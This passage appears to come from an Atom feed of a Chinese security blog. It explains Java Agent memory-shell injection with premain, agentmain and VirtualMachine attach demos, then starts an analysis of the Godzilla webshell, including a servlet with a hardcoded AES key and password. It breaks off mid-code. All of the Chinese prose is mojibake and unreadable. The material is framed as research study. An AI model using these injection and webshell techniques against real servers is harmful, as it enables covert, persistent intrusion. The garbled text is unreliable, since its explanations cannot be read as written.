è½½çš„class(ç±»å­—èŠ‚ç )è¿›è¡Œé‡æ–°åŠ è½½(Retransform)ã€‚</p></blockquote><blockquote><p>å¼€å‘è€…å¯ä»¥åœ¨ä¸€ä¸ªæ™®é€šJavaç¨‹åºï¼ˆå¸¦æœ‰mainå‡½æ•°çš„Javaç±»ï¼‰è¿è¡Œæ—¶ï¼Œé€šè¿‡<code>â€“javaagent</code>å‚æ•°æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„jaræ–‡ä»¶(åŒ…å«Instrumentationä»£ç†)æ¥å¯åŠ¨Instrumentationçš„ä»£ç†ç¨‹åºã€‚åœ¨ç±»çš„å­—èŠ‚ç è½½å…¥jvmå‰ä¼šè°ƒç”¨ClassFileTransformerçš„transformæ–¹æ³•ï¼Œä»è€Œå®ç°ä¿®æ”¹åŸç±»æ–¹æ³•çš„åŠŸèƒ½ï¼Œå®ç°AOPã€‚</p></blockquote><p>é€šè¿‡java.lang.instrumentå®ç°çš„å·¥å…·æˆ‘ä»¬ç§°ä¹‹ä¸ºJava Agentï¼ŒJava Agentèƒ½å¤Ÿåœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„æƒ…å†µä¸‹æ¥ä¿®æ”¹å­—èŠ‚ç ï¼Œå³åŠ¨æ€ä¿®æ”¹å·²åŠ è½½æˆ–è€…æœªåŠ è½½çš„ç±»ï¼ŒåŒ…æ‹¬ç±»çš„å±æ€§ã€æ–¹æ³•ï¼ŒAgentå†…å­˜é©¬çš„å®ç°å°±æ˜¯åˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§ä½¿å…¶åŠ¨æ€ä¿®æ”¹ç‰¹å®šç±»çš„ç‰¹å®šæ–¹æ³•ï¼Œå°†æˆ‘ä»¬çš„æ¶æ„æ–¹æ³•æ·»åŠ è¿›å»ã€‚</p><p>è¯´ç™½äº†Java Agentåªæ˜¯ä¸€ä¸ªJavaç±»è€Œå·²ï¼Œåªä¸è¿‡æ™®é€šçš„Javaç±»æ˜¯ä»¥mainå‡½æ•°ä½œä¸ºå…¥å£ç‚¹çš„ï¼ŒJava Agentçš„å…¥å£ç‚¹åˆ™æ˜¯premainå’Œagentmain</p><p>Java Agent æ”¯æŒä¸¤ç§æ–¹å¼è¿›è¡ŒåŠ è½½ï¼š</p><ul><li>å®ç° premain æ–¹æ³•ï¼Œåœ¨å¯åŠ¨æ—¶è¿›è¡ŒåŠ è½½ ï¼ˆè¯¥ç‰¹æ€§åœ¨ jdk 1.5 ä¹‹åæ‰æœ‰ï¼‰</li><li>å®ç° agentmain æ–¹æ³•ï¼Œåœ¨å¯åŠ¨åè¿›è¡ŒåŠ è½½ ï¼ˆè¯¥ç‰¹æ€§åœ¨ jdk 1.6 ä¹‹åæ‰æœ‰ï¼‰</li></ul><h2 id="premain"><a href="#premain" class="headerlink" title="premain"></a>premain</h2><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªpremainçš„agent:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DemoTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">premain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>agentArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"premain method is invoked!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åé€šè¿‡mvnæˆ–è€…mfæ–‡ä»¶æ‰“ç”ŸæˆjaråŒ…ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Premain</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">DemoTest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ©ç”¨javacç”Ÿæˆclassæ–‡ä»¶ä¹‹åæ‰“åŒ…ï¼š<code>jar cvfm agent.jar agent.mf DemoTest.class</code></p><p>ç„¶åå†åˆ›å»ºä¸€ä¸ªæ™®é€šçš„ç±»<code>Hello.java</code>å’Œmfæ–‡ä»¶:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Hello</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello,Java"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mfæ–‡ä»¶:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Manifest</span><span class="token operator">-</span><span class="token class-name">Version</span><span class="token operator">:</span> <span class="token number">1.0</span><span class="token class-name">Main</span><span class="token operator">-</span><span class="token class-name">Class</span><span class="token operator">:</span> <span class="token class-name">Hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åŒæ ·æ‰“åŒ…ä¸ºjar: <code>jar cvfm hello.jar hello.mf Hello.class</code></p><p>æ¥ä¸‹æ¥è¿è¡Œçš„æ—¶å€™å¢åŠ -javaagent:agent.jar: <code>java -javaagent:agent.jar=Hello -jar hello.jar</code><br><img src="/2022/06/23/java-agent-shell/2.png"></p><h2 id="agentmain"><a href="#agentmain" class="headerlink" title="agentmain"></a>agentmain</h2><p>é¦–å…ˆå¯¹è¿™ç§æ–¹å¼æœ‰ä¸€ä¸ªåˆæ­¥çš„è®¤è¯†ï¼Œéœ€è¦ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><h4 id="App-java"><a href="#App-java" class="headerlink" title="App.java"></a>App.java</h4><p>å¾ªç¯è¾“å‡ºï¼Œæ¨¡æ‹Ÿè¿è¡Œçš„åº”ç”¨</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">ManagementFactory</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">App</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token class-name">ManagementFactory</span><span class="token punctuation">.</span><span class="token function">getRuntimeMXBean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> pid <span class="token operator">=</span> name<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Pid is:"</span> <span class="token operator">+</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">500</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"App is Running!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="AgentDemo-java"><a href="#AgentDemo-java" class="headerlink" title="AgentDemo.java"></a>AgentDemo.java</h4><p>å®ç°<code>agentmain</code>åŠŸèƒ½ï¼Œç”¨äºagentçš„åŠŸèƒ½å®ç°</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>instrument<span class="token punctuation">.</span></span><span class="token class-name">Instrumentation</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AgentDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">agentmain</span><span class="token punctuation">(</span><span class="token class-name">String</span> agentArgs<span class="token punctuation">,</span> <span class="token class-name">Instrumentation</span> inst<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Surprise! I'm Agent Smith"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Inject-java"><a href="#Inject-java" class="headerlink" title="Inject.java"></a>Inject.java</h4><p>é€šè¿‡VirtualMachineçš„<code>loadAgent</code>æ–¹å¼ï¼ŒæŠŠAgentæ³¨å…¥æ­£åœ¨è¿è¡Œçš„Appé‡Œï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">agentmain<span class="token punctuation">.</span>demo1</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>tools<span class="token punctuation">.</span>attach<span class="token punctuation">.</span></span><span class="token class-name">VirtualMachine</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Inject</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> pid <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> jarName <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token class-name">VirtualMachine</span> vm <span class="token operator">=</span> <span class="token class-name">VirtualMachine</span><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">loadAgent</span><span class="token punctuation">(</span>jarName<span class="token punctuation">)</span><span class="token punctuation">;</span>        vm<span class="token punctuation">.</span><span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥ä¸Šä¸‰ä¸ªjavaæ–‡ä»¶é€šè¿‡IDEAæ‰“åŒ…ä¸ºJaræ–‡ä»¶ï¼Œé¦–å…ˆè¿è¡ŒApp.jarï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp JavaAgentDemo.jar agentmain.demo1.App<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åä½¿ç”¨Inject.jaræ³¨å…¥è¿›ç¨‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp JavaAgentDemo.jar agentmain.demo1.Inject <span class="token number">22932</span> /var/tmp/AgentDemo.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°App.jarçš„è¾“å‡ºè¢«åŠ¨æ€çš„æ”¹å˜äº†ï¼š<br><img src="/2022/06/23/java-agent-shell/3.png"></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="http://wjlshare.com/archives/1582">æµ…è°ˆJava Agentå†…å­˜é©¬</a></li><li><a href="https://su18.org/post/irP0RsYK1/">Java Instrumentation</a></li><li><a href="https://developer.aliyun.com/article/857055">å·å¤©æ¢æ—¥ï¼Œç”¨JavaAgentæ¬ºéª—ä½ çš„JVM</a></li><li><a href="https://y4er.com/post/javaagent-tomcat-memshell/">Java Agentå®ç°ååºåˆ—åŒ–æ³¨å…¥å†…å­˜shell</a></li><li><a href="https://www.freebuf.com/articles/web/323621.html">æ“…é•¿æ‰å¼„çš„å†…å­˜é©¬åŒå­¦ï¼šAgentå†…å­˜é©¬ï¼ˆä½å¡)</a></li><li><a href="https://xz.aliyun.com/t/9450">Java Agentä»å…¥é—¨åˆ°å†…å­˜é©¬</a></li><li><a href="https://www.cnblogs.com/wh4am1/p/15996108.html">ç’å¤©è¿‡æµ·è®¡ä¹‹Tomcatéšè—å†…å­˜é©¬</a></li><li><a href="https://mp.weixin.qq.com/s/OLNznd14NlzEzeGelRLV9g">Javaå®‰å…¨-è®°ä¸€æ¬¡å®æˆ˜ä½¿ç”¨memoryshell</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;å­¦ä¹ èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#å­¦ä¹ èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;å­¦ä¹ èƒŒæ™¯&quot;&gt;&lt;/a&gt;å­¦ä¹ èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2022/06/23/java-agent-shell/1.png&quot;&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Agentæœ¬æ¥å°±åœ¨å­¦ä¹ çš„æ¸…å•ä¸Š&lt;/li&gt;
&lt;li&gt;æ›´æ·±å…¥ç†è§£ä¸‹è‰å¸ˆå‚…è¯´çš„ä»£ç†æ¨¡å¼&lt;/li&gt;
&lt;li&gt;study the world&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;AOP&quot;&gt;&lt;a href=&quot;#AOP&quot; class=&quot;headerlink&quot; title=&quot;AOP&quot;&gt;&lt;/a&gt;AOP&lt;/h2&gt;&lt;p&gt;AOPä¸ºAspect Oriented Programmingçš„ç¼©å†™ï¼Œæ„ä¸º: é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œåœ¨è¿è¡Œæ—¶ï¼ŒåŠ¨æ€åœ°å°†ä»£ç åˆ‡å…¥åˆ°ç±»çš„æŒ‡å®šæ–¹æ³•ã€æŒ‡å®šä½ç½®ä¸Šçš„ç¼–ç¨‹æ€æƒ³å°±æ˜¯é¢å‘åˆ‡é¢çš„ç¼–ç¨‹ã€‚&lt;br&gt;ä»¥ä¸‹å¼•ç”¨æ¥è‡ªsu18å’Œå¤©ä¸‹å¤§æœ¨å¤´å¸ˆå‚…çš„åšå®¢ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;JDK 1.5 å¼€å§‹ï¼ŒJavaæ–°å¢äº†Instrumentation(Java Agent API)å’ŒJVMTI(JVM Tool Interface)åŠŸèƒ½ï¼Œå…è®¸JVMåœ¨åŠ è½½æŸä¸ªclassæ–‡ä»¶ä¹‹å‰å¯¹å…¶å­—èŠ‚ç è¿›è¡Œä¿®æ”¹ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒå¯¹å·²åŠ è½½çš„class(ç±»å­—èŠ‚ç )è¿›è¡Œé‡æ–°åŠ è½½(Retransform)ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;å¼€å‘è€…å¯ä»¥åœ¨ä¸€ä¸ªæ™®é€šJavaç¨‹åºï¼ˆå¸¦æœ‰mainå‡½æ•°çš„Javaç±»ï¼‰è¿è¡Œæ—¶ï¼Œé€šè¿‡&lt;code&gt;â€“javaagent&lt;/code&gt;å‚æ•°æŒ‡å®šä¸€ä¸ªç‰¹å®šçš„jaræ–‡ä»¶(åŒ…å«Instrumentationä»£ç†)æ¥å¯åŠ¨Instrumentationçš„ä»£ç†ç¨‹åºã€‚åœ¨ç±»çš„å­—èŠ‚ç è½½å…¥jvmå‰ä¼šè°ƒç”¨ClassFileTransformerçš„transformæ–¹æ³•ï¼Œä»è€Œå®ç°ä¿®æ”¹åŸç±»æ–¹æ³•çš„åŠŸèƒ½ï¼Œå®ç°AOPã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é€šè¿‡java.lang.instrumentå®ç°çš„å·¥å…·æˆ‘ä»¬ç§°ä¹‹ä¸ºJava Agentï¼ŒJava Agentèƒ½å¤Ÿåœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„æƒ…å†µä¸‹æ¥ä¿®æ”¹å­—èŠ‚ç ï¼Œå³åŠ¨æ€ä¿®æ”¹å·²åŠ è½½æˆ–è€…æœªåŠ è½½çš„ç±»ï¼ŒåŒ…æ‹¬ç±»çš„å±æ€§ã€æ–¹æ³•ï¼ŒAgentå†…å­˜é©¬çš„å®ç°å°±æ˜¯åˆ©ç”¨äº†è¿™ä¸€ç‰¹æ€§ä½¿å…¶åŠ¨æ€ä¿®æ”¹ç‰¹å®šç±»çš„ç‰¹å®šæ–¹æ³•ï¼Œå°†æˆ‘ä»¬çš„æ¶æ„æ–¹æ³•æ·»åŠ è¿›å»ã€‚&lt;/p&gt;
&lt;p&gt;è¯´ç™½äº†Java Agentåªæ˜¯ä¸€ä¸ªJavaç±»è€Œå·²ï¼Œåªä¸è¿‡æ™®é€šçš„Javaç±»æ˜¯ä»¥mainå‡½æ•°ä½œä¸ºå…¥å£ç‚¹çš„ï¼ŒJava Agentçš„å…¥å£ç‚¹åˆ™æ˜¯premainå’Œagentmain&lt;/p&gt;
&lt;p&gt;Java Agent æ”¯æŒä¸¤ç§æ–¹å¼è¿›è¡ŒåŠ è½½ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Java" scheme="https://jkme.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>å“¥æ–¯æ‹‰åŸç†åˆ†æ</title>
    <link href="https://jkme.github.io/2022/05/17/godzilla.html"/>
    <id>https://jkme.github.io/2022/05/17/godzilla.html</id>
    <published>2022-05-16T16:00:00.000Z</published>
    <updated>2022-05-23T07:48:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆ†æèƒŒæ™¯"><a href="#åˆ†æèƒŒæ™¯" class="headerlink" title="åˆ†æèƒŒæ™¯"></a>åˆ†æèƒŒæ™¯</h2><p>èµ·æºäº<code>Y4er</code>å¸ˆå‚…å‘çš„ä¸¤ç¯‡æ–‡ç« ï¼š</p><ul><li><a href="https://tttang.com/archive/1513/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></li></ul><p>å¯¹å…¶ä¸­çš„åŸå› æ¯”è¾ƒå¥½å¥‡ï¼Œæ‰€ä»¥å°è¯•å¯¹å“¥æ–¯æ‹‰åšäº†ä¸€æ¬¡åŸç†åˆ†æï¼Œæµ‹è¯•ä»£ç åœ¨<a href="https://github.com/JKme/MemoryShellDemo">MemoryShellDemo</a>ã€‚æ–‡ç« å¯èƒ½æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œå¯ä»¥åœ¨<a href="https://github.com/JKme/JKme.github.io/issues">issue</a>ç•™è¨€ã€‚</p><h2 id="è¿è¡ŒåŸç†"><a href="#è¿è¡ŒåŸç†" class="headerlink" title="è¿è¡ŒåŸç†"></a>è¿è¡ŒåŸç†</h2><p>ä»å“¥æ–¯æ‹‰çš„æºä»£ç é‡Œé¢æ‰£å‡ºæ¥<code>godzilla\shells\payloads\java\assets\payload.classs</code>æ–‡ä»¶ï¼Œä½¿ç”¨<a href="https://github.com/leibnitz27/cfr">https://github.com/leibnitz27/cfr</a>åç¼–è¯‘ä¹‹åï¼Œåœ¨ideaé‡Œé¢æ–°å»º<code>payload.java</code>æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹è¯¯æŠ¥é”™ï¼Œ<a href="https://gist.github.com/JKme/690c9562155c019570afd5ab06356658">è¿™é‡Œ</a>æ˜¯åç¼–è¯‘å¥½ä¹‹åçš„æ–‡ä»¶ã€‚<code>payload.java</code>å®ç°äº†å¤§éƒ¨åˆ†çš„shellæ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ã€æ•°æ®åº“è¿æ¥ç­‰ç­‰</p><p>æ–°å»ºä¸€ä¸ª<code>HelloServlet.java</code>ï¼Œç”¨äºåŠ¨æ€è°ƒè¯•ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">basic</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"helloServlet"</span><span class="token punctuation">,</span> value <span class="token operator">=</span> <span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> xc <span class="token operator">=</span> <span class="token string">"3c6e0b8a9c15224a"</span><span class="token punctuation">;</span>  <span class="token comment">//å®šä¹‰AESåŠ è§£å¯†çš„Keyï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠè¿”å›çš„responseä¹Ÿåšä¸€æ¬¡åŠ å¯†</span>    <span class="token class-name">String</span> pass <span class="token operator">=</span> <span class="token string">"pass"</span><span class="token punctuation">;</span>           <span class="token class-name">String</span> md5 <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span>pass <span class="token operator">+</span> xc<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//ç”¨äºè¿”å›responseåœ¨å¤´å’Œå°¾éƒ¨æ’å…¥æ ‡è¯†ç¬¦ï¼Œå¤´éƒ¨å–md5çš„å‰16ä½å­—ç¬¦ä¸²ï¼Œå°¾éƒ¨å–md5çš„å16ä½å­—ç¬¦ä¸²</span>    <span class="token class-name">Class</span> payload<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> ret <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span> m<span class="token punctuation">;</span>            m <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>MessageDigest</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"MD5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            m<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span>BigInteger</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">base64Encode</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span 